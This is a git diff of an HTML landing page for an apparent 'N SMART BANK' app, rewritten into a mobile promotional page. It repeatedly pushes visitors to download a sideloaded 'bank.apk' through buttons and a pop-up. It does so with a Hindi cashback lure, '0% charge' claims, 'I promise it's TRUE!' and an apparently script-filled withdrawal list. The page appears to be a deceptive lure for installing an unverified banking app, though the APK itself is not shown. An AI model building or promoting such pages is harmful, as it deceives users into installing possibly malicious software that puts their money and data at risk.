@@ -1,35 +1,96 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
+
 <head>
-	<title>Smart Bank online</title>
-	<link rel="stylesheet" type="text/css" href="style.css">
-		 <link href='http://fonts.googleapis.com/css?family=Montserrat:400,700%7CPT+Serif:400,700,400italic' rel='stylesheet'>
-		  <link href="https://fonts.googleapis.com/css?family=Montserrat|Open+Sans" rel="stylesheet">
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="viewport"
+      content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <meta name="format-detection" content="telephone=no, address=no, email=no">
+  <meta name="x5-orientation" content="portrait">
+  <meta name="x5-fullscreen" content="true">
+  <link rel="stylesheet" href="./css/basic.css">
+  <link rel="stylesheet" href="./css/style.css">
+  <meta name="screen-orientation" content="portrait">
+  <meta name="full-screen" content="yes">
+  <meta name="google" content="notranslate" />
+  <title>N SMART BANK</title>
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?c1af7f063c2e84a901532a9931854352";
+      var s = document.getElementsByTagName("script")[0]; 
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
 </head>
+  
 <body>
-
-	<div class="bgimage">
-		<div class="menu">
-			
-			<div class="leftmenu">
-				<h4> SMARTBANK </h4>
-			</div>
-
-			<div class="rightmenu">
-				
-			</div>
-
-		</div>
-
-		<div class="text">
-			<h4> Mobile recharge </h4>
-			<h1> SMART & BANK </h1>
-			<h3> Download smart bank latest version 4.1 </h3>
-			<a href="bank.apk" download="bank"><button id="buttonone" > Download Android </button></a>
-			<button id="buttontwo"> Help </button> 
-		</div>
-
-	</div>
-
+  <div id="mock" class="mock">
+    <div id="dialog" class="dialog">
+      <div class="close" onclick="closeDialog()"></div>
+      <div class="button" onclick="window.location='bank.apk'">
+        <div class="hand"></div>
+        <div class="icon"></div>
+        <div class="text button-text">Download  Now</div>
+      </div>
+      <div id="dialog-icon" class="icon"></div>
+      <div id="dialog-content" class="content">
+        <div><span><span ></span>कैशबैक <em class="value"></em></span>पाएं हर मोबाइल रिचार्ज पर,</div>
+        <div>download APP to get it now!</div>
+      </div>
+    </div>
+  </div>
+  <div class="wrapper">
+    <div class="container">
+      <div id="bg" class="container-bg"></div>
+      <div class="header">
+        <div class="user">
+          <div class="avatar">
+            <img id="avatar" src="./images/default_avator.png" alt="">
+          </div>
+          <div id="uid" class="id"></div>
+        </div>
+        <div id="dialog-text" class="dialog">
+          <div class="text-12">HEY!! I promise it's TRUE!</div>
+          <div class="text-14">Get <span></em><em class="value">Cashback</em></span> on every mobile recharge & Every Day Deposit or withdraw money at 0% charge.   <span><em class="value"></div>
+          <div class="text-14">N Smart Bank Download New Version <span><em class="value">4.2</em></span> </div>
+        </div>
+      </div>
+      <div id="main" class="main">
+        <div class="content">
+          <div class="hand"></div>
+          <div class="button" onclick="window.location='bank.apk'">
+            <span class="icon"></span>
+            <span class="text button-text">Download  Now</span>
+          </div>
+        </div>
+      </div>
+      <div class="footer">
+        <div id="content" class="content">
+          <ul id="withdraw-list" class="withdraw-list">
+            <li class="item"></li>
+            <li class="item"></li>
+            <li class="item"></li>
+            <li class="item"></li>
+            <li class="item"></li>
+            <li class="item"></li>
+            <li class="item"></li>
+            <li class="item"></li>
+            <li class="item"></li>
+            <li class="item"></li>
+          </ul>
+        </div>
+      </div>
+    </div>
+    <input id="copy-input" type="text" readonly>
+  </div>
 </body>
+<script src="https://unpkg.com/axios/dist/axios.min.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.8.0/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.8.0/firebase-analytics.js"></script>
+<script src="./js/utils.js"></script>
+<script src="./js/index.js"></script>
+<script src="./js/style.js"></script>
 </html>
